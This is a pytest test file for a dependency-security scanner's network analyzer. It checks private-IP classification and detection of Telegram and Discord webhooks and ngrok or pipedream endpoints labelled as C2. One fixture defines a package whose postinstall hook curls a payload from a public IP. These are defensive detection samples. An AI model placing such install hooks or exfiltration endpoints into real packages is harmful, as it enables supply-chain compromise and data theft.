"""Tests for network indicator analyzer."""
from __future__ import annotations

import pytest

from depshield.analyzers.network import NetworkAnalyzer, _is_private_ip, _scan_text
from depshield.core.models import FindingCategory, Severity
from tests.conftest import make_package


@pytest.fixture
def analyzer():
    return NetworkAnalyzer()


# ------------------------------------------------------------------ #
# IP classification                                                   #
# ------------------------------------------------------------------ #

class TestIPClassification:
    """Private vs public IP detection."""

    def test_localhost_is_private(self):
        assert _is_private_ip("127.0.0.1") is True

    def test_rfc1918_10_is_private(self):
        assert _is_private_ip("10.0.0.1") is True

    def test_rfc1918_172_is_private(self):
        assert _is_private_ip("172.16.0.1") is True

    def test_rfc1918_192_is_private(self):
        assert _is_private_ip("192.168.1.1") is True

    def test_public_ip_not_private(self):
        assert _is_private_ip("8.8.8.8") is False

    def test_another_public_ip(self):
        assert _is_private_ip("1.2.3.4") is False


# ------------------------------------------------------------------ #
# Text scanning                                                       #
# ------------------------------------------------------------------ #

class TestTextScanning:
    """Scan text for network indicators."""

    def test_hardcoded_public_ip_detected(self):
        hits = _scan_text("connect to 8.8.8.8 for DNS")
        assert len(hits) >= 1
        assert any("IP" in h[0] for h in hits)

    def test_localhost_not_flagged(self):
        hits = _scan_text("connect to 127.0.0.1:3000")
        ip_hits = [h for h in hits if "IP" in h[0]]
        assert len(ip_hits) == 0

    def test_private_ip_not_flagged(self):
        hits = _scan_text("server at 192.168.1.100")
        ip_hits = [h for h in hits if "IP" in h[0]]
        assert len(ip_hits) == 0

    def test_telegram_webhook_detected(self):
        hits = _scan_text("https://api.telegram.org/bot123456:ABC-DEF/sendMessage")
        assert any("Telegram" in h[0] for h in hits)

    def test_discord_webhook_detected(self):
        hits = _scan_text("https://discord.com/api/webhooks/123456/abcdef_token")
        assert any("Discord" in h[0] for h in hits)

    def test_ngrok_c2_detected(self):
        hits = _scan_text("fetch('https://abc123.ngrok.io/data')")
        assert any("C2" in h[0] or "ngrok" in h[2] for h in hits)

    def test_pipedream_detected(self):
        hits = _scan_text("https://eo123.m.pipedream.net")
        assert any("C2" in h[0] or "pipedream" in h[2] for h in hits)

    def test_clean_text_no_hits(self):
        hits = _scan_text("function add(a, b) { return a + b; }")
        assert len(hits) == 0


# ------------------------------------------------------------------ #
# Analyzer integration                                                #
# ------------------------------------------------------------------ #

class TestNetworkAnalyzer:
    """Full analyzer tests."""

    def test_script_with_ip(self, analyzer):
        pkg = make_package(
            name="sus",
            scripts={"postinstall": "curl http://45.33.32.156/payload"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1

    def test_clean_package_no_findings(self, analyzer):
        pkg = make_package(
            name="clean",
            scripts={"start": "node index.js"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0
